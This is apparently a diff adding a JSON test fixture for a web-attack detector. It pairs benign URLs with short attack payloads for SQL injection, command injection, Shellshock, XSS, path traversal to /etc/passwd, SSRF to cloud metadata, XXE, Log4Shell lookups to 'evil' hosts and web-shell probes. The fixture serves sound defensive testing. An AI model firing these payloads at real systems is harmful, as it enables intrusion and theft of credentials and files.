@@ -1,0 +1,177 @@
+[
+  {
+    "target": "/p?id=1%27%20or%201=1--+",
+    "expected": [
+      "sqli"
+    ]
+  },
+  {
+    "target": "/api/user?filter[$ne]=1",
+    "expected": [
+      "nosqli"
+    ]
+  },
+  {
+    "target": "/ping?host=127.0.0.1;whoami/",
+    "expected": [
+      "command_injection"
+    ]
+  },
+  {
+    "target": "/cgi?x=() { :;}; echo",
+    "expected": [
+      "shellshock"
+    ]
+  },
+  {
+    "target": "/page?name={{7*7}}",
+    "expected": [
+      "ssti"
+    ]
+  },
+  {
+    "target": "/search?q=*)(uid=*",
+    "expected": [
+      "ldap_injection"
+    ]
+  },
+  {
+    "target": "/x?q=<script>alert(1)</script>",
+    "expected": [
+      "xss"
+    ]
+  },
+  {
+    "target": "/download?file=../../../../etc/passwd",
+    "expected": [
+      "lfi_traversal"
+    ]
+  },
+  {
+    "target": "/load?page=http://evil.example/shell.txt",
+    "expected": [
+      "rfi"
+    ]
+  },
+  {
+    "target": "/fetch?url=http://169.254.169.254/latest/meta-data",
+    "expected": [
+      "rfi",
+      "ssrf",
+      "open_redirect"
+    ]
+  },
+  {
+    "target": "/import?data=<!ENTITY xxe SYSTEM %22file:///etc/passwd%22>",
+    "expected": [
+      "lfi_traversal",
+      "xxe"
+    ]
+  },
+  {
+    "target": "/api?o=O:8:%22stdClass%22",
+    "expected": [
+      "deserialization"
+    ]
+  },
+  {
+    "target": "/uploads/shell.php?cmd=whoami",
+    "expected": [
+      "webshell"
+    ]
+  },
+  {
+    "target": "/x?p=${jndi:ldap://evil/a}",
+    "expected": [
+      "log4shell"
+    ]
+  },
+  {
+    "target": "/path?class.module.classLoader.resources=1",
+    "expected": [
+      "spring4shell"
+    ]
+  },
+  {
+    "target": "/struts.action?redirect:${(new)}",
+    "expected": [
+      "struts_ognl"
+    ]
+  },
+  {
+    "target": "/?next=%0d%0aSet-Cookie:x",
+    "expected": [
+      "crlf_injection"
+    ]
+  },
+  {
+    "target": "/login?redirect=//evil.example",
+    "expected": [
+      "open_redirect"
+    ]
+  },
+  {
+    "target": "/..;/manager/html",
+    "expected": [
+      "access_bypass",
+      "cve_probe"
+    ]
+  },
+  {
+    "target": "/.git/config",
+    "expected": [
+      "sensitive_file"
+    ]
+  },
+  {
+    "target": "/download?f=file.php%00.jpg",
+    "expected": [
+      "null_byte"
+    ]
+  },
+  {
+    "target": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+    "expected": [
+      "webshell",
+      "cve_probe"
+    ]
+  },
+  {
+    "target": "/trace.axd",
+    "expected": [
+      "iis_aspnet"
+    ]
+  },
+  {
+    "target": "/",
+    "expected": []
+  },
+  {
+    "target": "/index.html",
+    "expected": []
+  },
+  {
+    "target": "/products?id=42&page=2&sort=price",
+    "expected": []
+  },
+  {
+    "target": "/static/css/main.min.css",
+    "expected": []
+  },
+  {
+    "target": "/api/v1/orders/1001",
+    "expected": []
+  },
+  {
+    "target": "/images/logo.png",
+    "expected": []
+  },
+  {
+    "target": "/blog/2026/07/a-normal-post-title",
+    "expected": []
+  },
+  {
+    "target": "/search?q=laptop+bag",
+    "expected": []
+  }
+]
